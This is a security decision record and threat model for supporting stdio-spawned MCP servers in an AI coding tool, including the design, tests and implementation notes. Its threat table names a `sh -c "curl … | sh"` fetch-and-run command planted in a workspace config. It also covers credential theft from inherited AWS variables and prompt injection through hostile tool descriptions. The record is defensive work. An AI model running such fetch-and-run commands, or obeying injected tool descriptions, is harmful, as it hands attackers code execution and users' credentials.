# Security review — stdio-spawned MCP servers

Decision record for IDE/CLI MCP. Written 31 July 2026.
**Superseded 1 August 2026: the deferral was lifted and §6 was implemented.**
See §9 for what shipped and what changed in the analysis along the way.

The engine's `McpServerRegistry` supports Streamable-HTTP MCP servers only, with
this note in the source:

> stdio-spawned local servers are deferred (spawning arbitrary configured
> processes from a committed JSON file is a real security surface deserving its
> own review, not a rider on this change)
> — `packages/agent-engine/src/mcp.ts`

§7F (historical master plan) asked for this review so the deferral does not become
permanent by default. **Conclusion: keep the deferral**, with a
concrete design for the day it is reopened.

---

## 1. What is actually being proposed

The MCP ecosystem's most common configuration shape is a command to run:

```jsonc
// .walkcroach/mcp.json — NOT supported today
{
  "servers": {
    "filesystem": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"] }
  }
}
```

Supporting it means: **read a file from the workspace, and execute the program
it names.**

## 2. Why this is different from every other execution path we already have

WalkCroach already runs commands — `run_terminal`, verify recipes, hooks. The
distinction is not "does code execute" but **what authorises the execution**.

| Path | Authorised by | Visible to the user before it runs |
|---|---|---|
| `run_terminal` | Approval gate, per command | Yes — the exact command, in a card |
| Verify recipes | `.walkcroach/verify.json`, run only when the agent calls `verify` | Yes — the recipe list is shown in the nudge |
| Hooks | `.walkcroach/settings.json`, and `assertHookCommandSafe` screens them | Partially |
| **stdio MCP** | **A JSON file, at connect time, before any agent turn** | **No** |

The last row is the problem. An MCP server starts when the *workspace opens*,
not when the agent decides to do something. There is no turn to attach an
approval to, and no natural moment to show a card. `git clone && code .` would
be enough to execute an attacker's command — the same class of vulnerability as
VS Code's own task auto-run and `.vscode/settings.json` issues, which is why
Workspace Trust exists.

## 3. Threats

| # | Threat | Notes |
|---|---|---|
| T1 | **Arbitrary code execution on clone.** `.walkcroach/mcp.json` in a repository names `command: "sh"`, `args: ["-c", "curl … \| sh"]` | Highest severity. No agent turn required |
| T2 | **Credential theft.** The spawned process inherits the environment, including `AWS_BEARER_TOKEN_BEDROCK` (BYOK), `AWS_PROFILE`, and anything else in the shell | The BYOK work in Part 1 §4A makes this strictly worse: the user's own AWS credentials are now reliably present |
| T3 | **PATH / argument injection.** `command: "npx"` resolves through `PATH`; a workspace-local `node_modules/.bin` or a crafted `args` entry redirects it | Mitigated only by absolute paths, which nobody writes in practice |
| T4 | **Tool-name shadowing.** A malicious server registers a tool named like a first-party one and intercepts calls | Partly mitigated today: `RESERVED_COCKROACHDB_SERVER_NAME` cannot be overridden. That protection is name-based and would need extending |
| T5 | **Prompt injection with a process behind it.** Tool *descriptions* are model-visible text. A hostile server can describe a tool persuasively and receive whatever the model sends | Exists for HTTP servers too, but stdio adds local execution to the payoff |
| T6 | **Persistence.** A spawned server outliving the window, or re-spawning, is indistinguishable from a legitimate long-running server | No supervision model exists today |

T1 and T2 together are the review's conclusion: on a machine configured for
BYOK, cloning a repository would hand over both code execution *and* the
credentials that pay for inference.

## 4. What already helps, and what it does not cover

- **Workspace Trust** — `assertTrusted(host)` blocks the agent loop in an
  untrusted workspace. Necessary but not sufficient: users trust repositories
  routinely, and trust is granted once for the whole folder.
- **`assertHookCommandSafe`** — screens hook commands. Precedent worth reusing;
  not currently applied to MCP config.
- **HTTP-only today** — a hostile `.walkcroach/mcp.json` can currently cause
  outbound requests to an attacker's server (T5), but **not** local execution.
  That is the whole value of the present restriction.

## 5. Decision (original — superseded by §9)

**Keep stdio unsupported.** The gap between what it buys and what it costs is
not close: the ecosystem convenience is real, but so is "clone a repo, lose
your AWS credentials", and nothing in the current architecture can gate a
connect-time spawn behind a user decision.

This is a decision with an expiry, not a permanent no. Reopen it when the
design in §6 is worth building — most plausibly when a user actually asks for
a specific stdio server that has no HTTP transport.

## 6. Design for the day it is reopened

Anything less than all of these is not enough:

1. **Explicit per-server consent, recorded and revocable.** First time a server
   is seen: a modal naming the exact `command` and `args`, plus a fingerprint
   of the config. Store consent keyed by fingerprint in `SecretStorage` — a
   changed command is a new decision, not a remembered one. This is the same
   shape as Chrome's per-site permission model.
2. **Never inherit the environment.** Spawn with an explicit, minimal `env`.
   `AWS_*`, `WALKCROACH_*`, `GITHUB_*` and every credential variable must be
   absent unless the user allow-lists one for that server. This alone removes
   T2.
3. **Absolute, resolved commands.** Resolve the binary once, show the resolved
   path in the consent prompt, and refuse a relative command or one resolving
   inside the workspace. Removes T3.
4. **Off by default, behind a setting.** `walkcroach.ide.mcp.allowStdio`,
   default `false`, with the risk stated in the setting description.
5. **Namespaced tools.** Expose third-party tools as `server__tool` so no
   configured server can shadow a first-party name. Generalises the existing
   reserved-name protection past a single hard-coded case (T4).
6. **Lifecycle ownership.** One supervisor owning spawn, health and kill, tied
   to window lifetime, with process-tree kill on dispose (`process-kill.ts`
   already does this for terminals). Removes T6.
7. **Visible in the UI.** Running servers, their commands, and a stop button —
   in the Setup view, not only in a log.

## 7. Tests any implementation must ship with

Written now so the bar is set before anyone is mid-implementation:

- A `.walkcroach/mcp.json` with a `command` and no recorded consent spawns nothing.
- Consent recorded for one command does **not** authorise a changed command.
- The spawned environment contains no `AWS_*` / `WALKCROACH_*` variable.
- A relative command, and one resolving inside the workspace, are both refused.
- With `allowStdio` false, a stdio entry is ignored with a warning and HTTP servers still work.
- A configured server cannot register a tool name colliding with a first-party tool.
- Disposing the window kills the process tree.

## 8. Interim guidance

For a server that only ships a stdio transport, run it yourself and point
WalkCroach at it over HTTP:

```bash
npx -y supergateway --stdio "npx -y @modelcontextprotocol/server-filesystem /path"
# then in .walkcroach/mcp.json: { "servers": { "fs": { "url": "http://127.0.0.1:8000/mcp" } } }
```

The user starts the process knowingly, which is exactly the property the
built-in path cannot provide.

---

## Review status

| Item | State |
|---|---|
| Threat model | Complete (§3) |
| Decision | ~~Keep deferred~~ → **implemented 2026-08-01** (§9) |
| Design if reopened | Complete (§6) |
| Test bar | Written (§7), **passing** — `mcp-stdio.test.ts`, 38 tests |
| Interim workaround | Documented (§8) |
| Re-review trigger | ~~superseded~~ — re-review if the spawn point ever moves earlier than agent-loop setup |

---

## 9. Implementation (1 August 2026)

The deferral was lifted deliberately, not by drift. Every §6 requirement shipped;
§7's test bar is `packages/agent-engine/src/mcp-stdio.test.ts`, whose `describe`
blocks are labelled T1–T7 against the bullets in §7.

### 9.1 What shipped

| §6 | Where |
|---|---|
| 1. Per-server consent, recorded and revocable | `registerConfiguredMcpServers` + `readStdioConsents` / `revokeStdioConsent` |
| 2. Never inherit the environment | `buildStdioEnv` |
| 3. Absolute, resolved commands | `resolveStdioCommand` |
| 4. Off by default, behind a setting | `HostAdapter.isStdioMcpAllowed` |
| 5. Namespaced tools | `qualifyToolName`, `McpServerRegistry.listAllTools` |
| 6. Lifecycle ownership | `StdioMcpSupervisor`, disposed with the window / CLI process |
| 7. Visible in the UI | IDE Setup view (server list, resolved command, pid, **Stop**, **Revoke**) + `walkcroach mcp list` / `mcp revoke` |

### 9.2 Three things the original review got wrong or left out

**The setting's *location* is the gate, and §6.4 did not say so.** "Off by default,
behind a setting" is insufficient on its own: the file being authorised
(`.walkcroach/mcp.json`) lives in the workspace, so a workspace-readable setting
would let a cloned repository switch on its own execution. The IDE setting is
therefore contributed with `"scope": "machine"`, which VS Code refuses to let
`.vscode/settings.json` override, and the CLI reads `mcpAllowStdio` from
`~/.walkcroach/config.json` **only** — deliberately inverting that module's normal
`project > user` precedence, which would otherwise have handed the decision to the
repository.

**T4 and T5 were not actually reachable.** §3 lists tool-name shadowing and
prompt-injection-via-tool-description as risks that "exist for HTTP servers too".
They did not: `listAllTools()` was called nowhere outside its own test, so no
third-party tool name or description ever reached the model. The exposure was
latent, not live. Namespacing was still implemented — it is what keeps them
unreachable now that stdio makes surfacing third-party tools attractive.

**Consent had to be storable as one record, not one key per server.** §6.1 asks for
consent that is "recorded and revocable", but `HostSecrets` exposes only
`get`/`store`. A key per fingerprint can be written and never enumerated or
withdrawn, so revocability would have been unimplementable without widening the
host interface on all surfaces. All consents live under a single
`mcp.stdio.consents` key as a fingerprint→record map.

### 9.3 The timing property that makes this defensible

§2 identified the real objection: an MCP server starts when the *workspace opens*,
so there is no turn to attach an approval to. Registration now happens during
agent-loop setup — after the user has sent a prompt — so a turn always exists and
the consent prompt has a natural home. **Opening a folder still spawns nothing.**

### 9.4 Deliberately not built

`walkcroach mcp status` showing live processes. The CLI is one-shot: `run` spawns,
works and exits, so a separate `status` invocation would own an empty supervisor
and could only report "nothing running". Printing that would be a lie dressed as a
feature, so `mcp list` passes no supervisor at all and reports `running: false`
honestly. Live process status belongs to the IDE Setup view, where a window
outlives a turn — that panel shows each server's resolved command, pid, and Stop /
Revoke buttons.

Both surfaces describe servers through one engine helper
(`describeConfiguredMcpServers`). Two implementations of "is this approved" would
eventually disagree, and the one that drifted would be telling someone their
machine is safer than it is.

Revoking does not kill a running server — the UI says so explicitly rather than
letting the user assume otherwise. Stop and Revoke are separate buttons because
they are separate decisions: one ends this process, the other withdraws permission
for the next one.

### 9.5 The interim workaround in §8 still works

Nothing about supergateway-over-HTTP is deprecated by this. A user who prefers to
start the process themselves should keep doing so; it remains the option with the
fewest moving parts.
